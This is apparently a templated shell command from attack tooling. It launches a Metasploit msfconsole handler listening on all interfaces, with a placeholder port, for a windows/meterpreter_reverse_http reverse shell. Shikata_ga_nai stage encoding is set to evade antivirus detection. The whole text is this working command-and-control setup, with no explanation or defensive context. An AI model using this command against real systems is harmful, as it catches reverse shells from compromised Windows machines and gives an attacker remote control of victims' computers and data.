msfconsole -q -x 'use exploit/multi/handler;
set LHOST 0.0.0.0;
set LPORT §LPORT§;
set LURI /meterpreter
set PAYLOAD windows/meterpreter_reverse_http;
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai;
set AutoLoadStdapi false;
run'
